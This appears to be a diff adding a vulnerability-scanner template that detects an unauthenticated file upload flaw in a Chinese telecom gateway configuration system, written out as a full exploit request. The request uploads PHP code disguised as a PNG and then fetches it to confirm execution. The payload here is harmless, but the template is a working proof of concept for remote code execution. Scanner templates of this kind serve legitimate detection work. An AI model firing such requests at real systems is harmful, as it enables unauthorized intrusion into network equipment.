@@ -1,0 +1,41 @@
+http:
+    - raw:
+        - |
+          POST /manager/teletext/material/rewrite.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+
+
+          ------WebKitFormBoundaryOKldnDPT
+          Content-Disposition: form-data; name="tmp_name"; filename="test.php"
+          Content-Type: image/png
+
+          <?php print(1111*2222);unlink(__FILE__);?>
+          ------WebKitFormBoundaryOKldnDPT
+          Content-Disposition: form-data; name="uploadtime"
+
+
+          ------WebKitFormBoundaryOKldnDPT--
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - "2468642"
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /xmedia/material/test.php HTTP/1.1
+          Host: {{Hostname}}
+id: dianxin-wg-rewrite-file-upload
+info:
+    author: Superhero
+    description: 电信网关配置管理系统/manager/teletext/material/rewrite.php接口存在文件上传漏洞,未经身份验证的远程攻击者可以利用文件上传漏洞获取系统权限。
+    name: 电信网关配置管理系统 rewrite.php 文件上传
+    severity: critical
+    tags:
+        - files-upload
+        - 电信网关配置管理系统
